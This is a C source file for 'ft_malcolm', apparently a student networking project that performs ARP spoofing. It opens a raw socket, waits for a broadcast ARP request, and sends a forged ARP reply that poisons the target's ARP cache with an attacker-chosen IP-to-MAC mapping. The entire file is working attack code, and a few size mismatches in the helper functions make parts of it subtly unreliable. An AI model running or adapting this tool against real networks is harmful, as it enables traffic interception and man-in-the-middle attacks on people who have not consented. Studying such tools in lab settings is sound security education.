#include "ft_malcolm.h"

int			check_mac_addr(char *mac_addr)
{
	if (ft_strlen(mac_addr) != 17)
		return (1);
	for (int i = 0; mac_addr[i]; i++)
	{
		if (i % 3 == 2 && mac_addr[i] != ':')
			return (1);
		else if (i % 3 != 2 && (mac_addr[i] < '0' ||
(mac_addr[i] > '9' && (mac_addr[i] < 'a' || mac_addr[i] > 'f'))))
			return  (1);
	}
	return (0);
}

int			get_interface(t_malcolm *malcolm)
{
	struct ifaddrs	*addrs;
	struct ifaddrs	*tmp;
	int				i = 1;
	int				ret = 1;

	getifaddrs(&addrs);
	tmp = addrs;
	while (tmp)
	{
		if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_PACKET &&
!(tmp->ifa_flags & IFF_LOOPBACK)) { // avoid 127.0.0.1
			printf("Found available interface: %s\n", tmp->ifa_name);
			ft_memcpy(&malcolm->ifa, tmp, sizeof(struct ifaddrs));
			malcolm->ifindex = i;
			ret = 0;
			break ;
		}
		tmp = tmp->ifa_next;
		i++;
	}
	freeifaddrs(addrs);
	if (ret)
		dprintf(STDERR_FILENO, "%s: No suitable available interface found.\n", PRG_NAME);
	return (ret);
}

t_arp_packet	*listen_arp_broadcast(t_malcolm *malcolm)
{
	t_arp_packet		*packet;
	unsigned char		buffer[sizeof(struct ethhdr) + sizeof(t_arp_packet)];

	packet = malloc(sizeof(t_arp_packet));
	ft_memset(buffer, 0, sizeof(struct ethhdr) + sizeof(t_arp_packet));
	while (ft_memcmp(buffer, "\xff\xff\xff\xff\xff\xff", 6))
	{
		if(recvfrom(malcolm->sockfd, &buffer, sizeof(buffer), 0, NULL, NULL) <= 0)
		{
			free(packet);
			return (NULL);
		}
	}
	ft_memcpy(packet, buffer + sizeof(struct ethhdr), sizeof(t_arp_packet));
	printf("An ARP request has been broadcast.\n");
	printf("	mac address of request: ");
	print_arp_mac(packet->sender_mac);
	printf("	IP address of request: ");
	print_arp_ip(packet->sender_ip);
	return (packet);
}

void		fill_arp_ip(unsigned char dest[IPV4_LENGTH], char *ip)
{
	size_t i = 0;
	size_t j = 0;
	while (i < ft_strlen(ip))
	{
		dest[j++] = ft_atoi(&ip[i]);
		while (ip[i] >= '0' && ip[i] <= '9')
			i++;
		if (ip[i])
			i++;
	}
}

void		fill_arp_mac(unsigned char dest[IPV4_LENGTH], char *mac)
{
	for (size_t i = 0; i < ft_strlen(mac); i += 3)
		dest[i / 3] = hex2int(&mac[i]);
}

void		send_arp_reply(t_malcolm *malcolm, t_arp_packet *received)
{
	unsigned char		buffer[sizeof(struct ethhdr) + sizeof(t_arp_packet) + PADDING];
	struct ethhdr		*ethhdr;
	t_arp_packet		*packet;

	ft_memset(buffer, 0, sizeof(buffer));
	ethhdr = (void *)buffer;
	ft_memcpy(ethhdr->h_dest, malcolm->target.arp_mac, sizeof(malcolm->target.arp_mac));
	ft_memcpy(ethhdr->h_source, malcolm->source.arp_mac, sizeof(malcolm->source.arp_mac));
    ethhdr->h_proto = htons(ETH_P_ARP);
	packet = (void *)buffer + sizeof(struct ethhdr);
	packet->arp_hdr.ar_hrd = received->arp_hdr.ar_hrd;
	packet->arp_hdr.ar_pro = received->arp_hdr.ar_pro;
	packet->arp_hdr.ar_hln = MAC_LENGTH;
	packet->arp_hdr.ar_pln = IPV4_LENGTH;
	packet->arp_hdr.ar_op = htons(ARPOP_REPLY);
	ft_memcpy(packet->sender_mac, malcolm->source.arp_mac, sizeof(malcolm->source.arp_mac));
	ft_memcpy(packet->sender_ip, malcolm->source.arp_ip, sizeof(malcolm->source.arp_ip));
	ft_memcpy(packet->target_mac, malcolm->target.arp_mac, sizeof(malcolm->target.arp_mac));
	ft_memcpy(packet->target_ip, malcolm->target.arp_ip, sizeof(malcolm->target.arp_ip));
/*
	print_arp_ip(packet->sender_ip);
	print_arp_mac(packet->sender_mac);
	print_arp_ip(packet->target_ip);
	print_arp_mac(packet->target_mac);
*/
	printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");
	if (sendto(malcolm->sockfd, &buffer, sizeof(buffer), 0, (struct sockaddr*)&malcolm->sockaddr, sizeof(malcolm->sockaddr)) <= 0)
	{
		dprintf(STDERR_FILENO, "%s: sendto: failed\n", PRG_NAME);
		return ;
	}
	printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");
}

int			init_malcolm(t_malcolm *malcolm, char *argv[])
{
	int				i;
	t_machine		*machines[2] = {&(malcolm->source), &(malcolm->target)};

	for (i = 1; i <= 4; i++)
	{
		int index = (i - 1) / 2;
		if (i % 2)
		{
			machines[index]->ip = argv[i];
			if ((machines[index]->inet_ip  = inet_addr(argv[i])) == INADDR_NONE)
				goto error;
			fill_arp_ip(machines[index]->arp_ip, machines[index]->ip);
		}
		else
		{
			machines[(i - 1) / 2]->mac = argv[i];
			if (check_mac_addr(argv[i]))
				goto error;
			fill_arp_mac(machines[index]->arp_mac, machines[index]->mac);
		}
	}
	malcolm->sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (malcolm->sockfd < 0)
	{
		dprintf(STDERR_FILENO, "%s: socket: Operation not permitted\n", PRG_NAME);
		return (1);
	}
	if (get_interface(malcolm))
		return (1);
	malcolm->sockaddr.sll_family = AF_PACKET;
	malcolm->sockaddr.sll_protocol = htons(ETH_P_ARP);
	malcolm->sockaddr.sll_ifindex = malcolm->ifindex;
	malcolm->sockaddr.sll_hatype = htons(ARPHRD_ETHER);
	malcolm->sockaddr.sll_pkttype = 0;
	malcolm->sockaddr.sll_halen = MAC_LENGTH;
	ft_memcpy(malcolm->sockaddr.sll_addr, malcolm->target.arp_mac, sizeof(malcolm->target.mac));
	return (0);
	error:
		dprintf(STDERR_FILENO, "%s: unknown host or invalid IP address: (%s).\n", PRG_NAME, argv[i]);
	return (1);
}

int			main(int argc, char *argv[])
{
	t_malcolm		malcolm;
	t_arp_packet	*received;

	if (argc != 5)
	{
		printf("Usage: %s <source_ip> <source_mac> <address_target_ip> <target_mac_address>\n", PRG_NAME);
		return (EXIT_FAILURE);
	}
	if (init_malcolm(&malcolm, argv))
		return (EXIT_FAILURE);
	if (!(received = listen_arp_broadcast(&malcolm)))
		return (EXIT_FAILURE);
	send_arp_reply(&malcolm, received);
	free(received);
	printf("Exiting program...\n");
	return (EXIT_SUCCESS);
}
